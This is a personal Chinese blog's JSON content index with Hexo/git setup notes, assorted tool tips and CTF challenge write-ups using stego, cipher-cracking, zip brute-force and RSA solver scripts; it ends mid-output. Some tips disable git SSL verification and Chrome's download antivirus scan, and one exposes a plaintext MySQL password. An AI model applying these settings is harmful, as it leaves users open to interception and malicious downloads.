{"meta":{"title":"张岩的博客","subtitle":"","description":"随手写写","author":"张岩","url":"http://xxxkkk578.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2024-04-09T15:51:42.302Z","updated":"2024-04-09T15:51:42.302Z","comments":true,"path":"archive.html","permalink":"http://xxxkkk578.github.io/archive.html","excerpt":"","text":""},{"title":"categories","date":"2024-04-09T16:15:55.000Z","updated":"2024-04-09T16:15:55.835Z","comments":true,"path":"categories/index.html","permalink":"http://xxxkkk578.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"博客相关","slug":"博客相关","date":"2024-04-10T11:23:20.000Z","updated":"2024-04-10T12:05:46.639Z","comments":true,"path":"2024/04/10/博客相关/","permalink":"http://xxxkkk578.github.io/2024/04/10/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/","excerpt":"","text":"安装git安装Node.js Hexo上传博客命令 123hexo cleanhexo ghexo d gitgit 报错 1git config --global http.sslVerify &quot;false&quot; git 无法连接server 1git config --global --unset http.proxy git 上传到远程仓库 方法后面的内容是github上项目的ssh地址 1git remote add origin git@github.com:fang-king/Selenium.git 同步github新建项目到本地 1git pull origin master 添加本地文件到缓存区 （后续只需从此步开始即可 1git add . 为上传文件添加注释 其中first push内容为注释的内容 1git commit -m &quot;first push&quot; 提交本地项目到github中 1git push origin master 笔记撰写使用如下命令创建新的笔记 1hexo new post name.md 文件头大概内容如下其中&#x2F; 根目录为source文件夹 即images文件夹应该放在source内 与_posts在同一目录下 12345678---title: your title date: 2024-04-09 23:09:33tags: CTF,Webcover: /images/01.jpgcoverWidth: 750coverHeight: 750--- 为什么我搜索不到自己的网站因为你的博客网站还没有被搜索引擎收录 可通过手动提交的方式加快收录进程Google收录网址 1https://search.google.com/search-console Baidu收录网址 1https://ziyuan.baidu.com/linksubmit/url 对Google 提交后 还应提交站点地图首先 在如下网站获取自己的站点地图 1https://www.xml-sitemaps.com/ start后 download your xml sitemap file 即可在Google search console 里编制索引-站点地图处 提交自己的站点地图url即可对于上传先将对应的html和xml文件移到source文件夹中然后我们可以在_config.yml中对 1skip_render: 进行修改从而使html和xml不被渲染 使之在上传后能正常展现","categories":[{"name":"知识类","slug":"知识类","permalink":"http://xxxkkk578.github.io/categories/%E7%9F%A5%E8%AF%86%E7%B1%BB/"}],"tags":[{"name":"tips","slug":"tips","permalink":"http://xxxkkk578.github.io/tags/tips/"}]},{"title":"日常应用技巧总结","slug":"tips","date":"2024-04-10T11:16:51.000Z","updated":"2024-04-10T11:19:07.401Z","comments":true,"path":"2024/04/10/tips/","permalink":"http://xxxkkk578.github.io/2024/04/10/tips/","excerpt":"","text":"tips0、联系 和 指导编程 计算机网络 操作系统 其他技术 1、切换python版本只需要调整环境变量中的各python次序，注意将script置于对应python下方（没用 在cmd中使用以下命令 1where python 找到对应目录下的python.exe文件后将其修改为对应版本的名称 如：python3.10.exe 之后便可使用对应版本的python进行pip 1python3.10 -m pip install gmpy2 2、word替换下箭头为回车符查找替换 将^l （小写L）全部替换为^p即可 3、应用md5值的校验123certutil -hashfile filename MD5certutil -hashfile filename SHA1certutil -hashfile filename SHA256 4、出现解压错误或者下载错误问题往往是因为含有中文路径 5、kali安装软件一律使用 1sudo apt install 新版本的kali使用此命令是包含了apt-get install 和最简单的apt install 6、nano使用方法 (mousepad or gedit 有gui)12345copy：ctrl+usearch: ctrl+wturn page :ctrl+y for the last page , ctrl+v for the next pagesave: ctrl+o escape:ctrl+x 7、kali图标很小点开左上角后搜索 开启即可 1kalihidpimode 8、提升kali虚拟机速度1、移除不必要的设备 2、使用以下命令查看自己电脑的cpu数 1dxdiag 然后拉内存 和 cpu 3、编辑-首选项-内存-额外内存-调整所有虚拟机内存使其适应预留的主机RAM 优先级-高 正常 快照两个取消勾选 设别-可移动介质-取消勾选 9、chrome下载文件检测到病毒1regedit 找到 1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments 将 1ScanWithAntiVirus 的值修改为1即可 10.python helpinteractive python 1help(&#x27;crypt&#x27;) to check the help of selected partuse 1:q to quit 11、zsteg工具安装12345sudo apt install gemgem sources -lgem sources --remove https://rubygems.org/gem sources -a http://gems.ruby-china.com/gem install zsteg 12、cpp文件变为exe1gcc main.cpp -o target.exe 13、大容量表格打开方法新建一个excel文档数据 - 新建查询 - 从文件 - 从工作簿导入数据后即可 14、修改新建文件列表win+r regedit 打开注册表然后到如下地址 1HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Discardable\\PostSetup\\ShellNew 然后再classes里面添加对应的后缀名在 1HKEY_CLASSES_ROOT 目录下 搜索你想要的后缀在该后缀内 添加项 改名为ShellNew同时添加字符串 NullFile 15、windows powershell无法运行脚本尝试运行dos命令报错 1CategoryInfo : ObjectNotFound: (C:\\Users\\alpha\\Desktop\\k.jpg\\b+k.txt\\a:String) [Copy-Item], ItemNotFoun dException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand 修改方式如下使用管理员权限打开windows powershell然后执行 1set-ExecutionPolicy RemoteSigned 之后查看计算机上的现用策略 1get-ExecutionPolicy 如果为 1RemoteSigned 则正确 16、conda换源使用中科大源 123456conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/main/conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/msys2/conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/bioconda/conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/menpo/ 使每次使用时显示源 1conda config --set show_channel_urls yes 17、ubuntu使用apt时报错发现有两个问题首先是源有问题使用 1lsb_release -a 查看自己的版本 12345No LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 22.04.4 LTSRelease: 22.04Codename: jammy 则应该使用jammy源其次是dns解析设置错误使用如下命令编辑dns文件 1sudo vim /etc/resolv.conf 清空 写入以下内容 12nameserver 8.8.8.8nameserver 114.114.114.114 即可完成配置之后执行以下命令测试并更新 1sudo apt update &amp;&amp; apt upgrade 18、pip换源使用以下命令即可永久修改 1pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 19、ida 常用命令shift + f12 查看字符串f5 反汇编x 查找变量的引用 20、conda使用方法创建新环境 1conda create --name 环境名称 python==3.7 查询已有环境 1conda env list 激活环境 1source activate 环境名称 关闭环境 1conda deactivate 复制环境 1conda create --name &lt;new_env_name&gt; --clone &lt;copied_env_name&gt; 删除环境 1conda remove --name &lt;env_name&gt; --all 当前环境包管理 12341）搜索包：conda search2）查看已安装包：conda list3）给指定某个环境安装包：conda install --name &lt;env_name&gt; &lt;package_name&gt;4）给当前环境中安装包：conda install &lt;package_name&gt; 21、mysql使用mysql的用户名及密码 1lazarus 打开 1MySQL 8.3 Command Line Client - Unicode 之后输入 1show databases； 可以看到数据库 则证明验证成功新建数据库user 1create database user; 使用user 1use user; 添加表username 用于记录账号和密码 1234create table username(user varchar(25),password varchar(25)); 在表里插入数据 记录用户密码 12insert into username(user,password)value (&quot;root&quot;,&quot;root&quot;); 查看username表中的内容 1select * from username; 设置数据库的密码 1SET PASSWORD FOR root@localhost = &#x27;123&#x27;; 22、查看网页源代码f12 或者 如下方法 1view-source:","categories":[{"name":"知识类","slug":"知识类","permalink":"http://xxxkkk578.github.io/categories/%E7%9F%A5%E8%AF%86%E7%B1%BB/"}],"tags":[{"name":"tips","slug":"tips","permalink":"http://xxxkkk578.github.io/tags/tips/"}]},{"title":"信抗实践课程CTF习题","slug":"School_CTF","date":"2024-04-10T11:01:26.000Z","updated":"2024-04-10T11:40:30.536Z","comments":true,"path":"2024/04/10/School_CTF/","permalink":"http://xxxkkk578.github.io/2024/04/10/School_CTF/","excerpt":"","text":"MARK12345678.____ | | _____ _____________ _______ __ __ ______| | \\__ \\ \\___ /\\__ \\\\_ __ \\ | \\/ ___/| |___ / __ \\_/ / / __ \\| | \\/ | /\\___ \\ |_______ (____ /_____ \\(____ /__| |____//____ &gt; \\/ \\/ \\/ \\/ \\/ MISC1、奇特的信息题目内容 1234567有人给你发了一串信息，你能解开吗？ Lw!Gyzvecy ke WvyVKT!W&#x27;zz by reso dsbdkwksky tzjq teo kly ujr. Teo keujr, gy joy dksurwmq bjdwv vorakeqojalr jmu wkd jaazwvjkwemd. Vorakeqojalr ljd j zemq lwdkeor, jzklesql gwkl kly juxymk et vecaskyod wk ljd qekkym oyjzzr vecazwvjkyu. Decy dwcazy ezu vwalyod joy kly Vjydjo vwalyo, kly Xwqymyoy vwalyo, kly dsbdkwkskwem vwalyo, glwvl wd klwd emy, jmu de em. Jzcedk jzz et klydy vwalyod joy yjdwzr boeiym keujr gwkl kly lyza et vecaskyod. Decy myg ymvorakwem cykleud joy JYD, kly vsooymk dkjmujou teo ymvorakwem, jzemq gwkl ODJ. Vorakeqojalr wd j xjdk twyzu jmu wd xyor wmkyoydkwmq klesql. De iwvi bjvi, oyju sa em decy veez vwalyod jmu ljxy tsm!El jmu teo reso oyveoud cr mjcy wd WvyVKT&#123;jzgjrd_zwdkym_ke_reso_dsbdkwksky_tzjqd&#125;. 不知所云 感觉应该是移位密码 但是不对尝试单表代换密码 使用以下网站 1https://quipqiup.com/ 上面的框输入文本 下面的框输入clue 由于该题原来是IceCTF 因此我们可以添加如下clue 1WvyVKT=IceCTF 运行即可 1有人给你发了一串信息，你能解开吗？ Hi! Welcome to IceCTF! I&#x27;ll be your substitute flag for the day. For today, we are studying basic cryptography and its applications. Cryptography has a long history, although with the advent of computers it has gotten really complicated. Some simple old ciphers are the Caesar cipher, the Vigenere cipher, the substitution cipher, which is this one, and so on. Almost all of these ciphers are easily broken today with the help of computers. Some new encryption methods are AES, the current standard for encryption, along with RSA. Cryptography is a vast field and is very interesting though. So kick back, read up on some cool ciphers and have fun! Oh and for your records my name is IceCTF&#123;always_listen_to_your_substitute_flags&#125;. 2、海市蜃楼文件名为zip 那么改名后解压得到一个docs文档 打不开 说损坏拖入kali 1file xxx 得知是一个zip文件 再次改名并解压得到很多的xml文件在对应文件夹下运行如下命令即可得到flag 1grep -rn &#x27;ISCC&#x27; ./* 得到flag 1ISCC&#123;zheshishui&#125; 3、美人计题目的提示 1美人说的话里有解题提示，但是美人的话不能全信。 打开后是图片加文档文档里面有一张二维码在图片 的 属性 主题 里面找到 1Try AES, and you will get the flag. ISCC2021 二维码解码得到 1U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/6IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu3GuGWmPOtO27z8vNppD2D50fwsD+8VWhdtW9J4cewYivH/Z/7GoUvcJXJMrvf+vu+CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE+pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8= aes解密试试 在如下这个网站 1https://www.sojson.com/encrypt_aes.html 连续解密三次后 1y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_! 换种思路 将docx后缀改为zip在.&#x2F;word&#x2F;media目录下发现两行二维码 扫描另一张二维码即可 1U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE 然后尝试aes解密 失败 那就试试des 成功 1ISCC&#123;be@uty_1ike$_Y0u_2O2lISCC&#125; 4、我的折扣是多少题目提示 1小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？ 在终端中运行give.exe 不要直接点开 因为会直接闪一下然后消失 1pass1&#123;\\u006b\\u0072\\u0077&#125; 一眼utf-16 搜索utf-16计算器 在如下网站 1https://m.jisuan.mobi/l61.html 解码即可 1krw 因为是pass1 故知道还有一段使用010editor打开图片 在文件末发现一串base64 1cGFzczJ7Z2NjNjY2fQ== 解码后得到 1pass2&#123;gcc666&#125; 合并得到压缩包的密码 1krwgcc666 解压缩后在txt中得到 1eW91Zm91bmRtZT8= 解码后得到 1youfoundme? 使用mp3stego进行解密 密码就是上面的youfoundme使用命令如下 1Decode.exe -X discount.mp3 -P youfoundme? 连续运行两次后得到 1ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU======&#125; 拿去解密即可 1ISCC&#123;Yourdiscount2.15&#125; 5、隐秘的信息题目信息 1乐乐在开始做作业时，遇到了一串ZWFzeV90b19maW5kX3RoZV9mbGFn字符串，研究了一番，什么都没有发现。乐乐能找到隐秘的信息并完成作业吗？ 将题目中的字符串拿去解码 base64 1easy_to_find_the_flag 拿去解压压缩包 得到了一张图片LSB隐写rgb 000 lsb_first在文件头出获取十六进制 123e92a68686f688aed ec8929064de62ded 4b2a87260888a92f 4b4fbffc01f8007f fffc7e3fe00fff00 71 之后cyber chef依次选择 from hex , to binary得到的二进制串 将第一个0前面所有的1删除 101001 00101010 01101000 01101000 01101111 01101000 10001010 11101101 11101100 10001001 00101001 00000110 01001101 11100110 00101101 11101101 01001011 00101010 10000111 00100110 00001000 10001000 10101001 00101111 01001011 01001111 10111111 11111100 00000001 11111000 00000000 01111111 11111111 11111100 01111110 00111111 11100000 00001111 11111111 00000000 01110001 然后 from binary 即可得到flag 1ISCC&#123;DWodIH2o1ojYT90DEIzZ&#125; 6、小明的表情包题目信息 1放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串密码“AVARGRRA AVARGL AVAR”中，你能帮小红得到小明的表情包吗？ 尝试凯撒解密 cyberchef rot13 13 直接解密得到 1NINETEEN NINETY NINE 则年份为1999 接下来爆破日月即可 使用ziprello 爆破除了密码 107071999 解压后得到一张图片 但是图片损坏使用010editor打开后添加jpg头即可 不是添加 直接修改前面几个0 即可 1ff d8 ff e0 00 10 4a 46 得到flag 1ISCC&#123;Nyuuiitt&#125; 7、藏在星空中的诗 1下载文件 得到 txt zip psdtxt打开时一堆字符 看不懂zip解压需要密码使用ps打开ps文件 拉满图层的透明度 出现顺序 113524 经测试 只有winrar可以解压 7z和bandzip都不可以解压 1☆✪٭☪✲🟔⍣☪🟐⍣✦✫🌠✡🞱✡🟇⍟⍟✸🟌🟔≛🟌✦ 解密使用的python代码 123456789101112key_dict = &#123;&#x27;٭&#x27;:&#x27;A&#x27;,&#x27;≛&#x27;:&#x27;B&#x27;,&#x27;⍟&#x27;:&#x27;C&#x27;,&#x27;⍣&#x27;:&#x27;D&#x27;,&#x27;★&#x27;:&#x27;E&#x27;, &#x27;☆&#x27;:&#x27;F&#x27;,&#x27;☪&#x27;:&#x27;G&#x27;,&#x27;⚝&#x27;:&#x27;H&#x27;,&#x27;✡&#x27;:&#x27;I&#x27;,&#x27;✦&#x27;:&#x27;J&#x27;,&#x27;✧&#x27;:&#x27;K&#x27;,&#x27;✪&#x27;:&#x27;L&#x27;,&#x27;✫&#x27;:&#x27;M&#x27;,&#x27;✮&#x27;:&#x27;N&#x27;, &#x27;✯&#x27;:&#x27;O&#x27;,&#x27;✴&#x27;:&#x27;P&#x27;,&#x27;🌟&#x27;:&#x27;Q&#x27;,&#x27;🟌&#x27;:&#x27;R&#x27;,&#x27;🟇&#x27;:&#x27;S&#x27;,&#x27;🌠&#x27;:&#x27;T&#x27;,&#x27;🟉&#x27;:&#x27;U&#x27;,&#x27;🟀&#x27;:&#x27;V&#x27;,&#x27;🟃&#x27;:&#x27;W&#x27;, &#x27;🟆&#x27;:&#x27;X&#x27;,&#x27;🟐&#x27;:&#x27;Y&#x27;,&#x27;🟔&#x27;:&#x27;Z&#x27;,&#x27;✲&#x27;:&#x27;=&#x27;,&#x27;✸&#x27;:&#x27;&#123;&#x27;,&#x27;🞱&#x27;:&#x27;&#125;&#x27;&#125;flag = &quot;☆✪٭☪✲✡🟇⍟⍟✸🟔⍣☪🟐⍣🟌🟔≛🟌✦✦✫🌠✡🞱&quot;for i in range((len(flag))): res = key_dict.get(flag[i]) print(res, end=&quot;&quot;) print(&#x27;\\n&#x27;) 得到flag 1FLAG=ISCC&#123;ZDGYDRZBRJJMTI&#125; 8、检查一下解压后是一张图片使用binwalk 进行分离 1binwalk -e 221B.png 在75645B文件中发现一大堆0和一共841个字符 很容易联想到是29*29的一个二维码二进制转二维码 1对应黑 0对应白使用如下python脚本即可 1234567891011121314from PIL import ImageMAX = 29img = Image.new(&quot;RGB&quot;,(MAX, MAX))str = &quotquot;i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): img.putpixel([x,y],(0, 0, 0)) else: img.putpixel([x,y],(255,255,255)) i = i+1img.show()img.save(&quot;flag.png&quot;) 将得到的二维码图片解码即可得到flag 1ISCC&#123;Png_Chunk_streams_ISCC&#125; 9、小明的宠物兔题目信息 1小明的宠物兔总是发出一些神秘的声音，小明很想知道兔兔在干什么，你能帮他翻译一下吗？ flag.txt里面的内容 1U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw== 还有带密码的zip文件该zip文件中有一个key.txt 原始大小只有5 代表只有5个字符 这时候可以考虑使用crc32碰撞进行 使用hx0战队开发的zipcracker进行操作 过程较慢 还得不到正确的结果无奈 使用如下python脚本进行爆破 12345678910111213import binasciiimport stringdic = string.printable crc = 0x3DACAC6B for i in dic: for j in dic: for p in dic: for q in dic: for a in dic: s = i+j+p+q+a if crc == (binascii.crc32(s.encode())): print(s) 得到key.txt文件中的内容为 1(0_0) 然后(0_0)作为密钥拿去rabbit解密即可 1ISCC&#123;u_really_know_rabbits&#125; 10、藏在星空中的诗2使用如下python代码进行解密 123456789101112flag = &quot;\\🌟🌠🌠✴🟉\\🌟🌠🌠★⍣\\🌟🌠🌠✴⍣\\🌟🌠🌠✴⍣\\🌟🌠🌠✧≛\\🌟🌠🌠✴✴\\🌟🌠🌠☆✴\\🌟🌠🌠✲✡\\🌟🌠🌠☆⍣\\🌟🌠🌠★☆\\🌟🌠🌠✧🟉\\🌟🌠🌠✴✲\\🌟🌠🌠✴☪\\🌟🌠🌠☆☆\\🌟🌠🌠⍣✴\\🌟🌠🌠⍣✧\\🌟🌠🌠⍣★\\🌟🌠🌠✴✡\\🌟🌠🌠✴✮\\🌟🌠🌠✧⚝&quot;key_dict2 = &#123; &#x27;٭&#x27;:&#x27;d&#x27;,&#x27;≛&#x27;:&#x27;b&#x27;,&#x27;⍟&#x27;:&#x27;f&#x27;,&#x27;⍣&#x27;:&#x27;3&#x27;,&#x27;★&#x27;:&#x27;5&#x27;,&#x27;☆&#x27;:&#x27;6&#x27;,&#x27;☪&#x27;:&#x27;a&#x27;,&#x27;⚝&#x27;:&#x27;d&#x27;,&#x27;✡&#x27;:&#x27;1&#x27;,&#x27;✦&#x27;:&#x27;6&#x27;,&#x27;✧&#x27;:&#x27;7&#x27;,&#x27;✪&#x27;:&#x27;a&#x27;,&#x27;✫&#x27;:&#x27;b&#x27;,&#x27;✮&#x27;:&#x27;e&#x27;,&#x27;✯&#x27;:&#x27;F&#x27;,&#x27;✴&#x27;:&#x27;4&#x27;,&#x27;🌟&#x27;:&#x27;u&#x27;,&#x27;🟌&#x27;:&#x27;c&#x27;,&#x27;🟇&#x27;:&#x27;7&#x27;,&#x27;🌠&#x27;:&#x27;0&#x27;,&#x27;🟉&#x27;:&#x27;9&#x27;,&#x27;🟀&#x27;:&#x27;0&#x27;,&#x27;🟃&#x27;:&#x27;3&#x27;,&#x27;🟆&#x27;:&#x27;6&#x27;,&#x27;🟐&#x27;:&#x27;0&#x27;,&#x27;🟔&#x27;:&#x27;4&#x27;,&#x27;✲&#x27;:&#x27;2&#x27;,&#x27;✸&#x27;:&#x27;8&#x27;,&#x27;🞱&#x27;:&#x27;1&#x27;,&#x27;\\\\&#x27;:&#x27;\\\\&#x27;&#125;res = &quot;&quot;for i in range((len(flag))): res +=(key_dict2.get(flag[i]))print(res.encode(&#x27;utf8&#x27;).decode(&#x27;unicode_escape&#x27;)) 得到flag 1ISCC&#123;Dd!cVyBJf475AN&#125; 11、套中套题目信息 1亲爱的CTFer走到一个巨大的盒子前，上面写满了0和1，却也看不出个所以然。仔细看了半夜，才在字缝中看出来，整个盒子都写着“套中套”…… png文件缺失png文件头 加上即可 189 50 4E 47 0D 0A 1A 0A 00 00 00 0D crc爆破图片宽高进行修复然后放进stegsolve里面继续进行观察 得到完整的第一段 1flag1:wELC0m3_T0_tH3 然后查看lsb隐写 使用zsteg工具 得到第二段 1flag2: _ISCC_Zo2z 两者合起来 得到压缩包的密码 1wELC0m3_T0_tH3_ISCC_Zo2z 解压后得到一些和密码学相关的东西经查询 为背包加密使用如下python脚本进行解密 即可 需要自己修改部分pubKey 和 encoded 的值pubKey的值 在 pub.Key文件中 而encoded的值在enc.txt文件中 可以先单独获取值后再运算 1234567891011121314151617181920212223242526272829303132333435import binascii# open the public key and strip the spaces so we have a decent array#fileKey = open(&quot;pub.Key&quot;, &#x27;rb&#x27;)pubKey = (&quot;&quot;).replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)# open the encoded message#fileEnc = open(&quot;enc.txt&quot;, &#x27;rb&#x27;)encoded =(&quot;&quot;).replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1):# print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False breakif flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M)# remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print(M) 该脚本应在如下网站上运行 注意代码类别改为python 1https://sagecell.sagemath.org/ 然后得到一串十六进制 1495343437b573058352d42726e302d664e43597d 解码即可 1ISCC&#123;W0X5-Brn0-fNCY&#125; 12、真相只有一个题目信息 1misc是英文miscellaneous的前四个字母，表示有杂项、混合体、大杂烩的意思，题目思路广，模式不定，线索众多，在这些线索中有的有用有的没用，最终的真相只有一个。 使用010editor检查stream文件 发现缺失zip文件头 故将前面的0000修改为 150 4B 之后添加后缀 发现解压需要密码使用stegosolve打开图片文件 lsb隐写 发现 1passwd.. .1998/xx/xx 则 猜测密码为8位 使用ziprello爆破即可 爆破后得到密码 119981111 流量包好像不正常 缺失了很多tftp的内容下面介绍一下正常流程tftp导出对象 获得password.mp3文件 该音频文件末是摩斯密码 解密后得到 1isccmisc 接着使用snow隐写解密即可 1SNOW.EXE -C -p &quot;isccmisc&quot; flag.txt 得到flag 1ISCC&#123;aHtI-D6Na-PlY5&#125; 13、好看的维吾尔族小姐姐下载得到一个压缩包 解压后得到一个文件 改后缀为png使用Deformed-Image-Restorer 爆破文件宽高 得到完整图片发现图片下方还有一个二维码data matrix解码即可然后倒转 unicode解码即可 14、菜鸟黑客1题目信息 123找出菜鸟黑客小明留下的flag文件附件下载链接：https://share.weiyun.com/z8AbACzC 密码：ISCC23 内存取证题目使用volatility 在kali中运行 1python vol.py -f test.raw filescan | grep flag 得到如下结果 120x7e332cc0 \\Users\\lenovo\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.lnk 2160x7e959a20 \\Users\\lenovo\\Desktop\\flag.txt 无法读取 使用RStudio technician工具打开 扫描后 在镜像文件的如下目录找到flag.txt 1\\Documents and Settings\\lenovo\\Desktop\\flag.txt flag.txt文件内容如下 1DES&#123;U2FsdGVkX19WerE/OZodh7liigwc7fzf8eWqByR8ixxENEvPwPpWzm2EL2f90UXO&#125; DES解密即可 密钥试了ISCC23 不对 改为ISCC2023后正确 15、RSA原题名为guess_rsa首先使用如下脚本读取公钥 123456from Crypto.PublicKey import RSAwith open(&quot;public.key&quot;,&quot;r&quot;) as f: key = RSA.import_key(f.read()) print(key.e) print(key.n) 或者使用kali 1openssl rsa -pubin -text -modulus -in ./publickey 得到 e 和 n 的 值分别为 1265537141290037064947566206529132717181370698234864868642699047557973411457219735533077057541763794458453776854205535054584663279827865601322416203933147042933586981716703290143924844104156938834839095947246954751648421206411462640039984758358072222401824528712347742351563547663982933462992608020341150998418481469 分别对三段密文进行解析 使用如下python脚本 1234567import gmpy2import libnumwith open(&quot;cryptotext1.txt&quot;,&quot;rb&quot;) as f1: c1 = f1.read() c1 = libnum.s2n(c1)print(c1) 得到了三段密文的内容 123c1=15675664162517005241985334850747322279876279456574700862907552681481377133185544579989247038799479171776327240780404882118904537725766312056443466295064750703372005792416973033030771437551025381553764003235556081094078622478104365189796833112914604071350200351731894133093904945300457608647456120613115797620c2=140861103274216455230721845501898308648236818144495265653434927079070691530723508171403973717514275151780171294904394774518093215002953258888100585054189890096052341414700257111375220034066504715553430076834975116291241799793991901777387974579764040747570218791785702867501258811622798523769676652686058178795c3=99529796079917923667416703621596340605976154418748680997166709360261843180294998507573349072387930043122958288285449187996957718834900637362680133270163491814007472682256839243994660305780477877832077377778094226956503797223980753581850455217835856249465622909655714810911375056415139213238490343537769816334 对图片进行分析 1zsteg pic.png 得到一串16进制 作为dp 138:10:44:a0:4c:6c:66:07:8e:89:66:8f:d7:3c:b8:2c:4f:10:16:1b:e4:c6:f3:a1:27:81:69:8d:00:ef:ba:83:8c:db:4b:43:73:bd:72:eb:dc:a4:9a:64:70:e5:9f:9f:b8:41:3a:3b:2a:c7:ac:85:0f:17:6c:4d:65:ef:7a:b5 使用如下python命令去除：即可 123456s = &#x27;38:10:44:a0:4c:6c:66:07:8e:89:66:8f:d7:3c:b8:2c:4f:10:16:1b:e4:c6:f3:a1:27:81:69:8d:00:ef:ba:83:8c:db:4b:43:73:bd:72:eb:dc:a4:9a:64:70:e5:9f:9f:b8:41:3a:3b:2a:c7:ac:85:0f:17:6c:4d:65:ef:7a:b5&#x27;dic = s.split(&quot;:&quot;)r = &#x27;&#x27;for i in dic: r+=iprint(r) 得到dp 1381044a04c6c66078e89668fd73cb82c4f10161be4c6f3a12781698d00efba838cdb4b4373bd72ebdca49a6470e59f9fb8413a3b2ac7ac850f176c4d65ef7ab5 解密使用的python脚本 12345678910111213141516171819202122232425262728#coding=utf-8#coding=utf-8import gmpy2 as gpfrom Crypto.Util.number import long_to_bytese = 65537n = 141290037064947566206529132717181370698234864868642699047557973411457219735533077057541763794458453776854205535054584663279827865601322416203933147042933586981716703290143924844104156938834839095947246954751648421206411462640039984758358072222401824528712347742351563547663982933462992608020341150998418481469dp = int(&#x27;381044a04c6c66078e89668fd73cb82c4f10161be4c6f3a12781698d00efba838cdb4b4373bd72ebdca49a6470e59f9fb8413a3b2ac7ac850f176c4d65ef7ab5&#x27;,16)c=[&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;]c[0]=15675664162517005241985334850747322279876279456574700862907552681481377133185544579989247038799479171776327240780404882118904537725766312056443466295064750703372005792416973033030771437551025381553764003235556081094078622478104365189796833112914604071350200351731894133093904945300457608647456120613115797620c[1]=140861103274216455230721845501898308648236818144495265653434927079070691530723508171403973717514275151780171294904394774518093215002953258888100585054189890096052341414700257111375220034066504715553430076834975116291241799793991901777387974579764040747570218791785702867501258811622798523769676652686058178795c[2]=99529796079917923667416703621596340605976154418748680997166709360261843180294998507573349072387930043122958288285449187996957718834900637362680133270163491814007472682256839243994660305780477877832077377778094226956503797223980753581850455217835856249465622909655714810911375056415139213238490343537769816334def deco(i): r = int(c[i]) # print(c) for i in range(1, e): # 在范围(1,e)之间进行遍历 if (dp * e - 1) % i == 0: if n % (((dp * e - 1) // i) + 1) == 0: # 存在p，使得n能被p整除 p = ((dp * e - 1) // i) + 1 q = n // (((dp * e - 1) // i) + 1) phi = (q - 1) * (p - 1) # 欧拉定理 d = gp.invert(e, phi) # 求模逆 m = pow(r, d, n) # 快速求幂取模运算 print(m) print(long_to_bytes(m))if __name__ == &#x27;__main__&#x27;: for i in range(3): deco(i) 得到如下结果 1234567020881530429097481514723214909974233683126368822572073387059645779959845264296442980548893877350458223153845246212412002294106684529801596571361335103636305224939773342783308218985769147524040018302831085203309479116094148349456719725594881761667000276252019258112625908466633829935996244422179490967562b&#x27;\\x02\\x8f;\\xbb\\x87syg\\xe2\\xcb\\xebD\\xeb]TW\\xa9\\xaemO5Y\\xf9\\xa2\\x90&#125;\\\\\\x15Rp6\\xfb\\xd9\\x92\\xf2W\\xe9u\\r\\xed\\x88\\x9b\\xab\\xbedb\\x9fc\\xd8\\xb5&#123;\\x860\\xc8\\xa50Jv]\\x9e\\xc7\\xd4\\x9c\\xef\\xfb\\n=\\x0c\\xa5\\xffY\\xbb\\x8a\\xd1\\xf9\\x12\\xef`\\xd8\\x12A\\x19\\xc71\\x0f\\xf9e\\x90\\xf8\\x16I\\xb7g\\xeb\\n6\\xc9.L]-\\xcc\\x00ISCC&#123;iu5a!ui*3qehbca@90\\n&#x27;7175334553457738185991428010074164509924795326278033127193055360431917307780118227066512427453873190202243142603482297607413637493653657343728477184572915181650057268210859790681626999264022150826050533597876471316054999941043727684357178640889709188598625199205002534771018614365469082122510421369315850b&#x27;\\x02\\x9d\\xa5\\xda\\xbd\\x07\\xd2p\\x9a\\xb1?V\\xf9\\xa8\\xab|\\x8a\\xe4\\x8d\\x97\\xd0[~\\xd9\\xb9\\x9e\\x